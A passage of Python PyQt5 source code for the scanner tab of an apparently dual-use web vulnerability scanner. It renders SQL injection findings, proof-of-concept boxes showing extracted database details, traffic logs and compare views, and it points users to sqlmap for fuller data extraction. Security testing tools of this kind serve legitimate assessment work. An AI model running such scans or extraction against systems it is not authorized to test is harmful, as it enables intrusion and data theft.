                    for ev in [e for e in evidence_items if e.get('length_increase')]:
                        lines.append(f"         • Payload   : {ev.get('payload', '')}")
                        lines.append(f"           Baseline  : {ev.get('baseline_length', '?')}b")
                        lines.append(f"           Response  : {ev.get('response_length', '?')}b")
                        lines.append(f"           Increase  : +{ev.get('length_increase', '?')}b "
                                     f"(+{ev.get('relative_increase_pct', '?')}%)")
                    lines.append("")

                if indicators.get('auth_bypass'):
                    lines.append("       ⛞ AUTH BYPASS EVIDENCE:")
                    for ev in [e for e in evidence_items if e.get('payload')]:
                        lines.append(f"         • Payload   : {ev.get('payload', '')}")
                        lines.append(f"           Status    : HTTP {ev.get('status_code', '?')}")
                        loc = ev.get('redirect_destination', '(none)')
                        lines.append(f"           Redirect  : {loc}")
                        lines.append(f"           Evidence  : {ev.get('evidence', 'auth indicators matched')}")
                    lines.append("")

                # Baseline for reference
                bl = point.get('baseline', {})
                lines.append(
                    f"       🖂 Baseline: status={bl.get('status','?')}, "
                    f"length={bl.get('length','?')}b, time={bl.get('time','?')}s"
                )

                if point.get('param_reflected'):
                    lines.append(
                        "       ℹ  Note: param value is reflected in response "
                        "(stricter detection thresholds applied)"
                    )

                lines.append("")
                lines.append("  " + "-" * 55)
                lines.append("")

            lines.append(f"🗠 TOTAL TESTS PERFORMED : {result.get('total_tests_performed', 0)}")
            lines.append(f"◉ VULNERABLE POINTS FOUND: {len(result.get('vulnerable_points', []))}")
            lines.append("")

            # ── PROOF OF CONCEPT SECTION ──────────────────────────────────────
            # Collect every poc dict stored across all vulnerable points
            all_pocs = []
            for detail in result.get('details', []):
                poc_found = None
                # Time-based stores poc directly on the evidence item
                for ev in detail.get('evidence', []):
                    if isinstance(ev, dict) and ev.get('poc'):
                        poc_found = ev['poc']
                        break
                if poc_found:
                    all_pocs.append((detail, poc_found))

            if all_pocs:
                W = 72
                LINE = "═" * W

                def _pad(text):
                    text = str(text)
                    if len(text) > W:
                        text = text[:W - 3] + "..."
                    return f"║{text:<{W}}║"

                def _row(label, value):
                    label_col = f"  {label:<16}: "
                    avail = W - len(label_col)
                    value = str(value or "")
                    if len(value) > avail:
                        value = value[:avail - 3] + "..."
                    return f"║{label_col}{value:<{avail}}║"

                lines.append(f"╔{LINE}╗")
                lines.append(_pad(f"{'⛏  PROOF OF CONCEPT SUMMARY  ⛏':^{W}}"))
                lines.append(f"╚{LINE}╝")
                lines.append("")

                for poc_idx, (detail, poc) in enumerate(all_pocs, 1):
                    lines.append(f"╔{LINE}╗")
                    lines.append(_pad(f"{'⛏  SQL INJECTION — PROOF OF CONCEPT  #' + str(poc_idx):^{W}}"))
                    lines.append(f"╠{LINE}╣")

                    # Target
                    lines.append(_pad("  🞋 TARGET"))
                    lines.append(_row("URL",        poc.get("target_url", "?")))
                    lines.append(_row("Inj. Point", poc.get("injection_point", "?")))
                    orig = poc.get("original_value", "")
                    param_line = poc.get("parameter", "?")
                    if orig:
                        param_line += f'  (original value: "{orig}")'
                    lines.append(_row("Parameter",  param_line))

                    # DB Engine — show scanner hint and confirmed type if different
                    db_engine   = poc.get("db_engine", "?")
                    detected_db = poc.get("detected_db_type", db_engine)
                    if detected_db and detected_db != db_engine and db_engine not in ("Generic SQL", "Unknown", "Generic"):
                        lines.append(_row("DB Engine", f"{db_engine}  →  confirmed: {detected_db}"))
                    else:
                        lines.append(_row("DB Engine", detected_db or db_engine))

                    lines.append(_row("Technique",  poc.get("technique", "unknown")))

                    # Extracted data
                    has_data = any(poc.get(f) for f in ("version", "db_name", "db_user", "hostname", "data_dir", "tables"))
                    lines.append(f"╠{LINE}╣")
                    lines.append(_pad("  🗠 EXTRACTED DATA"))
                    if has_data:
                        if poc.get("version"):
                            lines.append(_row("Version",  poc["version"]))
                        if poc.get("db_name"):
                            lines.append(_row("DB Name",  poc["db_name"]))
                        if poc.get("db_user"):
                            lines.append(_row("DB User",  poc["db_user"]))
                        if poc.get("hostname"):
                            lines.append(_row("Hostname", poc["hostname"]))
                        if poc.get("data_dir"):
                            lines.append(_row("Data Dir", poc["data_dir"]))
                        if poc.get("tables"):
                            lines.append(_row("Tables",   poc["tables"]))
                    else:
                        note = poc.get("extraction_note", "")
                        if note:
                            import textwrap as _tw
                            lines.append(_pad("  ⚠  EXTRACTION FAILED — Vulnerability IS confirmed but data"))
                            lines.append(_pad("      could not be pulled via the probes tried. Reason:"))
                            for ln in _tw.wrap(note, W - 6):
                                lines.append(_pad(f"      {ln}"))
                        else:
                            lines.append(_pad("  ⚠  No data extracted via error/union channel."))
                            lines.append(_pad("      Blind-only — time-based delay confirmed injection only."))
                            lines.append(_pad("      Use sqlmap --technique=T for full data extraction."))

                    # Per-field winning payload + before/after diff
                    diffs   = poc.get("diffs", {})
                    winning = poc.get("winning_payloads", {})

                    for field_name in ("version", "db_name", "db_user", "hostname", "data_dir", "tables"):
                        if field_name not in winning:
                            continue
                        payload_str = winning[field_name]
                        diff        = diffs.get(field_name, {})
                        technique   = diff.get("technique", poc.get("technique", "?"))
                        orig_val    = poc.get("original_value", "")

                        lines.append(f"╠{LINE}╣")
                        lines.append(_pad(f"  🔧 WINNING PAYLOAD — {field_name}  ({technique})"))
                        lines.append(_row("Payload",    payload_str.strip()))
                        full_val = f"{orig_val}{payload_str.strip()}" if orig_val else payload_str.strip()
                        lines.append(_row("Full value", full_val))

                        sb     = diff.get("status_before",  "?")
                        sa     = diff.get("status_after",   "?")
                        lb     = diff.get("length_before",  "?")
                        la     = diff.get("length_after",   "?")
                        ld     = diff.get("length_diff",    "?")
                        ld_str = (f"+{ld}" if isinstance(ld, int) and ld >= 0 else str(ld)) if ld != "?" else "?"
                        lines.append(_row("Before",     f"HTTP {sb}  |  {lb} bytes"))
                        lines.append(_row("After",      f"HTTP {sa}  |  {la} bytes  ({ld_str} bytes)"))

                    lines.append(f"╚{LINE}╝")
                    lines.append("")

            lines.append("=" * 60)
            lines.append("Review the Traffic tab for the full HTTP request/response of each finding.")
            lines.append("=" * 60)

        else:
            lines.append("")
            lines.append(result.get('summary', 'No SQL injection vulnerabilities detected.'))
            lines.append("")
            lines.append(f"🗠 TESTS PERFORMED: {result.get('total_tests_performed', 0)}")

        return lines
    
    def stop_scan(self):
        """Stop the current scan"""
        if self.current_scan_worker and self.current_scan_worker.isRunning():
            self.current_scan_worker.stop()   # sets running=False, unblocks events/executor
            # Give the thread up to 5 s to exit gracefully before forcing it
            if not self.current_scan_worker.wait(5000):
                self.current_scan_worker.terminate()
                self.current_scan_worker.wait(2000)
            self.scan_status_label.setText("⏹ Scan stopped")
            self.start_scan_btn.setEnabled(True)
            self.stop_scan_btn.setEnabled(False)
            self.progress_bar.setVisible(False)
            self.step_next_btn.setVisible(False)
            self.step_next_btn.setEnabled(False)
    
    # ── One-by-one step mode slots ─────────────────────────────────────────────

    def _on_step_paused(self, label: str):
        """
        Called from the scan thread (via queued signal) after a probe request
        finishes.  Enables the Next button and updates the status bar.
        """
        self.step_next_btn.setEnabled(True)
        short = (label[:48] + "…") if len(label) > 48 else label
        self.scan_status_label.setText(f"⏸ Paused — click ↠ Next to continue  [{short}]")

    def _on_step_next_clicked(self):
        """
        User clicked the Next button.  Disable it immediately (re-enabled by
        _on_step_paused after the next request), then unblock the worker thread.
        """
        self.step_next_btn.setEnabled(False)
        self.scan_status_label.setText("▶ Sending next probe…")
        worker = self.current_scan_worker
        if worker and worker.isRunning():
            worker._step_event.set()

    # ──────────────────────────────────────────────────────────────────────────

    def clear_results_and_logs(self):
        """Clear all results and logs"""
        reply = QMessageBox.question(
            self,
            "Clear Results & Logs",
            "Clear all scan results and logs? (Queue and traffic will be preserved)",
            QMessageBox.Yes | QMessageBox.No
        )
        
        if reply == QMessageBox.Yes:
            self.scan_results.clear()
            self.scan_logs.clear()
            self.results_text.clear()
            self.logs_text.clear()
            
            for row in range(self.queue_table.rowCount()):
                _ui = self.queue_table.item(row, 1)
                if _ui:
                    _ui.setForeground(QBrush(QColor(COLOR_TEXT_MUTED)))  # reset to queued colour
            
            self.scan_status_label.setText("✓ Results and logs cleared")
            QTimer.singleShot(2000, lambda: self.scan_status_label.setText("Ready"))
    
    def clear_queue(self):
        """Clear scan queue"""
        reply = QMessageBox.question(
            self,
            "Clear Queue",
            "Clear scan queue? (Results, logs, and traffic will be preserved)",
            QMessageBox.Yes | QMessageBox.No
        )
        
        if reply == QMessageBox.Yes:
            self.scan_queue.clear()
            self.queue_table.setRowCount(0)
            self._queue_count_label.setText("0 items")
            self.scan_status_label.setText("✓ Queue cleared")
            QTimer.singleShot(2000, lambda: self.scan_status_label.setText("Ready"))
    
    def _toggle_all_scans(self):
        """Select or deselect all scan type checkboxes."""
        state = self._all_scans_btn.isChecked()
        for cb in [
            self.bypass_checkbox, self.xss_checkbox, self.sqli_checkbox,
            self.lfi_checkbox, self.cmdi_checkbox, self.idor_checkbox,
            self.upload_checkbox, self.ssrf_checkbox, self.xxe_checkbox,
            self.nosqli_checkbox, self.cors_checkbox,
            self.open_redirect_checkbox,
        ]:
            cb.setChecked(state)
        self._all_scans_btn.setText("None" if state else "All")

    def on_boost_mode_changed(self, state):
        """Handle boost mode checkbox state change"""
        if state:
            # Warn if Slow preset is active — Slow+Boost is contradictory
            if self._scan_speed_preset == "slow":
                self.scan_status_label.setText(
                    "⚠  Boost ON + Slow preset: delay/retry settings still apply per-request"
                )
            else:
                self.scan_status_label.setText(
                    f"⚡ Boost Mode ON — parallel requests ({self._scan_max_workers} workers) "
                    f"+ {self._scan_speed_preset} preset"
                )
        else:
            self.scan_status_label.setText(
                f"Boost Mode OFF — sequential requests + {self._scan_speed_preset} preset"
            )
        QTimer.singleShot(3000, lambda: self.scan_status_label.setText("Ready"))
    
    # ------------------------------------------------------------------
    # Response search
    # ------------------------------------------------------------------

    def _on_resp_search_changed(self):
        """Triggered when response search term changes or checkbox is toggled."""
        self._search_response_text(self.resp_search_input.text())

    def _search_response_text(self, term: str):
        """Highlight all occurrences of *term* in response_text.
        When auto-scroll checkbox is checked, scroll to the first match."""
        from PyQt5.QtWidgets import QTextEdit as _QTE
        from PyQt5.QtGui import QTextDocument as _QTD

        extra_selections: list = []

        if term:
            fmt = QTextCharFormat()
            fmt.setBackground(QBrush(QColor("#f5a623")))   # orange highlight
            fmt.setForeground(QBrush(QColor("#000000")))

            doc = self.response_text.document()
            cursor = doc.find(term, 0)                     # case-insensitive by default
            while not cursor.isNull():
                sel = _QTE.ExtraSelection()
                sel.format = fmt
                sel.cursor = cursor
                extra_selections.append(sel)
                cursor = doc.find(term, cursor)

            count = len(extra_selections)
            if count:
                self.resp_search_match_label.setText(
                    f"{count} match{'es' if count != 1 else ''}"
                )
                self.resp_search_match_label.setStyleSheet(
                    f"color: {COLOR_SUCCESS}; font-size: 11px;"
                )
                if self.resp_auto_scroll_cb.isChecked():
                    self.response_text.setTextCursor(extra_selections[0].cursor)
                    self.response_text.ensureCursorVisible()
            else:
                self.resp_search_match_label.setText("No matches")
                self.resp_search_match_label.setStyleSheet(
                    f"color: {COLOR_HIGH}; font-size: 11px;"
                )
        else:
            self.resp_search_match_label.setText("")

        self.response_text.setExtraSelections(extra_selections)

    # ------------------------------------------------------------------

    def toggle_auto_scroll(self):
        """Toggle auto-scroll for traffic table"""
        if self.auto_scroll_traffic.isChecked():
            self.auto_scroll_traffic.setText(" Auto-scroll: ON")
        else:
            self.auto_scroll_traffic.setText(" Auto-scroll: OFF")
    
    def clear_url_filter(self):
        """Clear URL filter and show all traffic"""
        self.current_filtered_url = None
        self.additional_filtered_urls = []
        self.traffic_url_label.setText("(All URLs)")
        self.show_all_urls_btn.setVisible(False)
        self.filter_traffic()
    
    def clear_traffic(self):
        """Clear traffic log"""
        reply = QMessageBox.question(
            self,
            "Clear Traffic",
            "Clear all traffic entries?",
            QMessageBox.Yes | QMessageBox.No
        )
        
        if reply == QMessageBox.Yes:
            self.traffic_entries.clear()
            self.traffic_table.setRowCount(0)
            self.request_text.clear()
            self.response_text.clear()
            self.current_filtered_url = None
            self.additional_filtered_urls = []
            self.traffic_url_label.setText("(All URLs)")
            self.show_all_urls_btn.setVisible(False)
            self._baseline_length = None
            self._baseline_time   = None
            self.scan_status_label.setText("✓ Traffic cleared")
            QTimer.singleShot(2000, lambda: self.scan_status_label.setText("Ready"))
    
    def clear_all(self):
        """Clear everything"""
        reply = QMessageBox.question(
            self,
            "Clear All",
            "Clear queue, results, logs, and traffic?",
            QMessageBox.Yes | QMessageBox.No
        )
        
        if reply == QMessageBox.Yes:
            self.scan_queue.clear()
            self.queue_table.setRowCount(0)
            self.scan_results.clear()
            self.scan_logs.clear()
            self.results_text.clear()
            self.logs_text.clear()
            self.traffic_entries.clear()
            self.traffic_table.setRowCount(0)
            self.request_text.clear()
            self.response_text.clear()
            self.current_filtered_url = None
            self.additional_filtered_urls = []
            self.traffic_url_label.setText("(All URLs)")
            self.show_all_urls_btn.setVisible(False)
            self._baseline_length = None
            self._baseline_time   = None

            self.scan_status_label.setText("✓ Everything cleared")
            QTimer.singleShot(2000, lambda: self.scan_status_label.setText("Ready"))
    
    def show_traffic_context_menu(self, position):
        """Show context menu for traffic table"""
        row = self.traffic_table.rowAt(position.y())
        if row < 0 or row >= len(self.traffic_entries):
            return

        menu = QMenu()

        resend_action        = menu.addAction("⭮ Resend Request")
        menu.addSeparator()
        copy_url_action      = menu.addAction("🗈 Copy Full URL")
        copy_request_action  = menu.addAction("🗈 Copy Request")
        copy_response_action = menu.addAction("🗈 Copy Response")
        menu.addSeparator()
        filter_url_action    = menu.addAction("⌕ Show Only This URL")
        menu.addSeparator()
        compare_left_action  = menu.addAction("⬅  Set as LEFT  (Baseline)")
        compare_right_action = menu.addAction("➡  Set as RIGHT (Payload / B)")
        open_compare_action  = menu.addAction("⤭ Open Compare Tab")
        menu.addSeparator()
        send_endpoints_action = menu.addAction("→ Send to Attack Surface")
        send_report_action     = menu.addAction("� Report Bug")

        action = menu.exec_(self.traffic_table.viewport().mapToGlobal(position))

        entry = self.traffic_entries[row]

        if action == resend_action:
            self.resend_traffic_request(entry)
        elif action == copy_url_action:
            QApplication.clipboard().setText(entry.url)
            self._status("✓ URL copied to clipboard")
        elif action == copy_request_action:
            QApplication.clipboard().setText(_format_request(entry))
            self._status("✓ Request copied to clipboard")
        elif action == copy_response_action:
            response_text = f"HTTP {entry.status_code}\n"
            for key, value in entry.response_headers.items():
                response_text += f"{key}: {value}\n"
            response_text += f"\n{entry.response_body}"
            QApplication.clipboard().setText(response_text)
            self._status("✓ Response copied to clipboard")
        elif action == filter_url_action:
            self.current_filtered_url = entry.url
            short_url = entry.url if len(entry.url) <= 60 else entry.url[:57] + "..."
            self.traffic_url_label.setText(f"(Filtering: {short_url})")
            self.show_all_urls_btn.setVisible(True)
            self.filter_traffic()
        elif action == compare_left_action:
            self._load_compare_left(entry)
        elif action == compare_right_action:
            self._load_compare_right(entry)
        elif action == open_compare_action:
            self._open_compare_tab()
        elif action == send_endpoints_action:
            self._send_to_endpoints_from_traffic(entry)
        elif action == send_report_action:
            self._send_to_report_from_traffic(entry)

    def _send_to_endpoints_from_traffic(self, entry: TrafficEntry):
        """Send a traffic entry to the Attack Surface tab."""
        try:
            main_win = self.window()
            if not hasattr(main_win, 'attack_surface_tab'):
                return
            raw_request = _format_request(entry)
            finding = {
                "url":          entry.url,
                "method":       entry.method,
                "status":       str(entry.status_code or ""),
                "request_text": raw_request,
                "source":       "Scanner",
            }
            main_win.attack_surface_tab.add_from_http_history(finding)
            for i in range(main_win.tab_widget.count()):
                if "Attack Surface" in main_win.tab_widget.tabText(i):
                    main_win.tab_widget.setCurrentIndex(i)
                    break
            self._status("✓ Sent to Attack Surface")
        except Exception as e:
            logger.error(f"[ScannerTab] send to attack surface: {e}")

    def _send_to_report_from_traffic(self, entry: TrafficEntry):
        """Open the Report Bug dialog pre-filled from a Scanner traffic entry."""
        try:
            main_win = self.window()
            report_tab = getattr(main_win, 'report_tab', None)
            if report_tab is None or not hasattr(report_tab, 'add_from_finding'):
                return
            finding = {
                "url":    entry.url,
                "method": entry.method,
                "source": "Scanner",
            }
            report_tab.add_from_finding(finding)
            for i in range(main_win.tab_widget.count()):
                if "Report" in main_win.tab_widget.tabText(i):
                    main_win.tab_widget.setCurrentIndex(i)
                    break
            self._status("✓ Opened Report Bug dialog")
        except Exception as e:
            logger.error(f"[ScannerTab] send to report: {e}")

    def resend_traffic_request(self, entry: TrafficEntry):
        """Resend a request from the traffic log"""
        self._status("⏳ Resending request...")
        
        # Use ResendWorker to execute in background
        self._traffic_resend_worker = ResendWorker(entry)
        self._traffic_resend_worker.finished.connect(self._on_traffic_resend_finished)
        self._traffic_resend_worker.error.connect(self._on_traffic_resend_error)
        self._traffic_resend_worker.start()

    def _on_traffic_resend_finished(self, new_entry: TrafficEntry):
        self.add_traffic_entry(new_entry)
        self._status("✓ Request resent")
        
    def _on_traffic_resend_error(self, error: str):
        self._status(f"✗ Resend failed: {error}")

    def show_queue_context_menu(self, position):
        """Show context menu for queue table"""
        row = self.queue_table.rowAt(position.y())
        if row < 0 or row >= len(self.scan_queue):
            return
        
        menu = QMenu()
        
        copy_url_action = menu.addAction("🗈 Copy Full URL")
        menu.addSeparator()
        remove_action = menu.addAction("🗑 Remove from Queue")
        
        action = menu.exec_(self.queue_table.viewport().mapToGlobal(position))
        
        if action == copy_url_action:
            url = self.scan_queue[row].get("url", "")
            QApplication.clipboard().setText(url)
            self.scan_status_label.setText(f"✓ URL copied to clipboard")
            QTimer.singleShot(2000, lambda: self.scan_status_label.setText("Ready"))
        elif action == remove_action:
            self.queue_table.removeRow(row)
            if row < len(self.scan_queue):
                del self.scan_queue[row]
            self.scan_status_label.setText(f"✓ Request removed ({len(self.scan_queue)} remaining)")
    
    # ------------------------------------------------------------------
    # Compare tab helpers
    # ------------------------------------------------------------------

    def _load_compare_left(self, entry: TrafficEntry):
        """Load entry into the LEFT slot of the Compare tab."""
        if self.compare_tab is None:
            return
        self.compare_tab.load_left(entry)
        self._status("⬅  Loaded into Compare LEFT slot")

    def _load_compare_right(self, entry: TrafficEntry):
        """Load entry into the RIGHT slot of the Compare tab."""
        if self.compare_tab is None:
            return
        self.compare_tab.load_right(entry)
        self._status("➡  Loaded into Compare RIGHT slot")

    def _open_compare_tab(self):
        """Switch the visible tab to Compare."""
        if self.compare_tab is None:
            return
        self.content_tabs.setCurrentWidget(self.compare_tab)

    # ------------------------------------------------------------------
    # Convenience
    # ------------------------------------------------------------------

    def _status(self, msg: str, timeout: int = 2000):
        """Show a timed status message in the toolbar label."""
        self.scan_status_label.setText(msg)
        QTimer.singleShot(timeout, lambda: self.scan_status_label.setText("Ready"))

    @staticmethod
    def _compare_tab_style() -> str:
        """Extra style overrides for the Compare tab widget."""
        return """
            QGroupBox {
                border: 1px solid #3a3a3a;
                border-radius: 4px;
                margin-top: 6px;
                padding-top: 4px;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                subcontrol-position: top left;
                padding: 0 4px;
                color: #ccc;
            }
            QTableWidget {
                font-size: 8pt;
            }
        """

    def apply_styling(self):
        """Apply dark theme styling"""
        self.setStyleSheet(f"""
            QWidget {{
                background-color: {COLOR_ELEVATED_BG};
                color: {COLOR_TEXT};
            }}
            QTableWidget {{
                background-color: {COLOR_ELEVATED_BG};
                border: 1px solid {COLOR_BORDER};
                gridline-color: {COLOR_BORDER};
            }}
            QTableWidget::item {{
                padding: 5px;
            }}
            QTableWidget::item:selected {{
                background-color: {COLOR_ACCENT};
            }}
            QHeaderView::section {{
                background-color: {COLOR_ELEVATED_BG};
                color: {COLOR_TEXT_BRIGHT};
                padding: 5px;
                border: 1px solid {COLOR_BORDER};
                font-weight: bold;
            }}
            QPushButton {{
                background-color: {COLOR_ACCENT};
                color: {COLOR_TEXT_BRIGHT};
                border: none;
                padding: 8px 15px;
                border-radius: 4px;
                font-weight: bold;
            }}
            QPushButton:hover {{
                background-color: {COLOR_SUCCESS};
            }}
            QPushButton:disabled {{
                background-color: {COLOR_BORDER};
                color: {COLOR_TEXT_MUTED};
            }}
            QTextEdit {{
                background-color: {COLOR_ELEVATED_BG};
                border: 1px solid {COLOR_BORDER};
                color: {COLOR_TEXT};
            }}
            QComboBox {{
                background-color: {COLOR_ELEVATED_BG};
                border: 1px solid {COLOR_BORDER};
                padding: 5px;
                color: {COLOR_TEXT};
            }}
            QLineEdit {{
                background-color: {COLOR_ELEVATED_BG};
                border: 1px solid {COLOR_BORDER};
                padding: 5px;
                color: {COLOR_TEXT};
            }}
            QTabWidget::pane {{
                border: 1px solid {COLOR_BORDER};
            }}
            QTabBar::tab {{
                background-color: {COLOR_ELEVATED_BG};
                color: {COLOR_TEXT};
                padding: 8px 15px;
                border: 1px solid {COLOR_BORDER};
            }}
            QTabBar::tab:selected {{
                background-color: {COLOR_ACCENT};
                color: {COLOR_TEXT_BRIGHT};
            }}
        """)


def add_scanner_tab(parent) -> QWidget:
    """Add scanner tab to the main window"""
    scanner_tab = ScannerTab(parent)
    parent.tab_widget.addTab(scanner_tab, "Scanner")
    parent.scanner_tab = scanner_tab
    return scanner_tab